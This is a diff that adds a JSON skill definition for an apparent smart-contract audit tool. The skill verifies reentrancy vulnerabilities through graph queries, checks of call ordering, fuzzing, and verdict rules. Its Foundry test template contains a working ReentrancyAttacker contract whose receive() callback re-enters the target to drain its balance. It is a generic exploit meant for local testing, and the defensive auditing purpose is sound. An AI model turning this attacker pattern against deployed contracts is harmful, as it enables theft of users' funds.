@@ -1,0 +1,167 @@
+{
+  "id": "grimoire-reentrancy",
+  "name": "Reentrancy Verification Grimoire",
+  "category": "reentrancy",
+  "subcategories": ["classic", "cross-function", "read-only", "cross-contract"],
+  "skill": "/test-reentrancy",
+  "aliases": ["/verify-reentrancy", "/check-reentrancy"],
+  "description": "Expert procedure for verifying reentrancy vulnerabilities. Analyzes external call ordering, checks for guards, generates Foundry tests with malicious callbacks, and interprets results.",
+  "version": "1.0.0",
+  "author": "VKG Team",
+  "tags": ["critical", "common", "foundry", "testing"],
+
+  "required_context": [
+    "function_code",
+    "external_call_sites",
+    "state_writes_after_calls"
+  ],
+  "optional_context": [
+    "call_graph_1_hop",
+    "contract_balance",
+    "reentrancy_guard_status"
+  ],
+
+  "graph_queries": [
+    "FIND functions WHERE state_write_after_external_call = true",
+    "FIND functions WHERE has_reentrancy_guard = false AND has_external_call = true"
+  ],
+
+  "procedure": {
+    "steps": [
+      {
+        "step_number": 1,
+        "name": "Check Graph Properties",
+        "action": "check_graph",
+        "description": "Query VKG for reentrancy indicators",
+        "inputs": ["graph_data", "node_properties"],
+        "outputs": ["graph_matches", "cei_violation_detected"],
+        "queries": [
+          "state_write_after_external_call",
+          "has_reentrancy_guard",
+          "transfers_value_out"
+        ],
+        "timeout_seconds": 10
+      },
+      {
+        "step_number": 2,
+        "name": "Check CEI Sequence",
+        "action": "check_sequence",
+        "description": "Verify Checks-Effects-Interactions ordering",
+        "inputs": ["sequence_data"],
+        "outputs": ["sequence_violated", "operation_order"],
+        "timeout_seconds": 10
+      },
+      {
+        "step_number": 3,
+        "name": "Generate Exploit Test",
+        "action": "generate_test",
+        "description": "Generate Foundry test with attacker contract callback",
+        "inputs": ["function_code", "contract_name", "function_name"],
+        "outputs": ["generated_test_path", "test_code"],
+        "tools": ["foundry"],
+        "template": "foundry_reentrancy",
+        "timeout_seconds": 60,
+        "optional": true
+      },
+      {
+        "step_number": 4,
+        "name": "Execute Test",
+        "action": "execute_test",
+        "description": "Run the generated Foundry test",
+        "inputs": ["generated_test_path"],
+        "outputs": ["test_output", "test_passed", "test_failed"],
+        "tools": ["foundry"],
+        "command": "forge test --match-test testReentrancy -vvv",
+        "timeout_seconds": 120,
+        "optional": true,
+        "skip_if": "!generated_test_path"
+      },
+      {
+        "step_number": 5,
+        "name": "Fuzz for Edge Cases",
+        "action": "execute_fuzz",
+        "description": "Run Medusa/Echidna to find edge case reentrancies",
+        "inputs": ["contract_path"],
+        "outputs": ["fuzz_report", "fuzz_found_issue"],
+        "tools": ["medusa", "echidna"],
+        "timeout_seconds": 120,
+        "optional": true
+      },
+      {
+        "step_number": 6,
+        "name": "Analyze Results",
+        "action": "analyze_results",
+        "description": "Analyze all test and fuzz results",
+        "inputs": ["test_output", "fuzz_report", "graph_matches"],
+        "outputs": ["exploit_successful", "analysis_complete"],
+        "timeout_seconds": 30
+      },
+      {
+        "step_number": 7,
+        "name": "Determine Verdict",
+        "action": "determine_verdict",
+        "description": "Make final vulnerability determination",
+        "inputs": ["exploit_successful", "sequence_violated", "graph_matches", "has_guard"],
+        "outputs": ["verdict", "confidence"],
+        "timeout_seconds": 10
+      }
+    ],
+    "verdict_rules": [
+      {
+        "condition": "exploit_successful",
+        "verdict": "vulnerable",
+        "confidence": "high",
+        "explanation": "Exploit test confirmed reentrancy is exploitable"
+      },
+      {
+        "condition": "fuzz_found_issue",
+        "verdict": "vulnerable",
+        "confidence": "high",
+        "explanation": "Fuzzer found reentrancy violation"
+      },
+      {
+        "condition": "sequence_violated && !has_guard",
+        "verdict": "likely_vulnerable",
+        "confidence": "medium",
+        "explanation": "CEI violation without reentrancy guard - likely vulnerable"
+      },
+      {
+        "condition": "graph_matches && !has_guard",
+        "verdict": "likely_vulnerable",
+        "confidence": "medium",
+        "explanation": "State write after external call without guard"
+      },
+      {
+        "condition": "has_guard",
+        "verdict": "likely_safe",
+        "confidence": "medium",
+        "explanation": "Reentrancy guard present"
+      },
+      {
+        "condition": "!sequence_violated && !graph_matches",
+        "verdict": "safe",
+        "confidence": "medium",
+        "explanation": "No CEI violation and proper call ordering"
+      }
+    ],
+    "default_verdict": "uncertain"
+  },
+
+  "tools_config": {
+    "foundry_enabled": true,
+    "hardhat_enabled": false,
+    "medusa_enabled": true,
+    "echidna_enabled": true,
+    "medusa_duration": 60,
+    "echidna_duration": 60,
+    "fork_enabled": true,
+    "fork_rpc": "",
+    "fork_block": "latest",
+    "testnet_enabled": false,
+    "testnet_network": "sepolia"
+  },
+
+  "test_templates": {
+    "foundry_reentrancy": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"${CONTRACT_PATH}\";\n\ncontract ReentrancyAttacker {\n    ${CONTRACT_NAME} public target;\n    uint256 public attackCount;\n\n    constructor(address _target) {\n        target = ${CONTRACT_NAME}(_target);\n    }\n\n    function attack() external payable {\n        // Initial call to vulnerable function\n        target.${FUNCTION_NAME}{value: msg.value}();\n    }\n\n    receive() external payable {\n        if (attackCount < 5 && address(target).balance > 0) {\n            attackCount++;\n            target.${FUNCTION_NAME}();\n        }\n    }\n}\n\ncontract ReentrancyTest is Test {\n    ${CONTRACT_NAME} public target;\n    ReentrancyAttacker public attacker;\n\n    function setUp() public {\n        target = new ${CONTRACT_NAME}();\n        attacker = new ReentrancyAttacker(address(target));\n        vm.deal(address(target), 10 ether);\n        vm.deal(address(attacker), 1 ether);\n    }\n\n    function testReentrancy() public {\n        uint256 targetBalanceBefore = address(target).balance;\n        uint256 attackerBalanceBefore = address(attacker).balance;\n\n        attacker.attack{value: 1 ether}();\n\n        // If attacker drained more than deposited, reentrancy worked\n        assertGt(\n            address(attacker).balance,\n            attackerBalanceBefore,\n            \"Reentrancy attack should have drained funds\"\n        );\n    }\n}"
+  }
+}
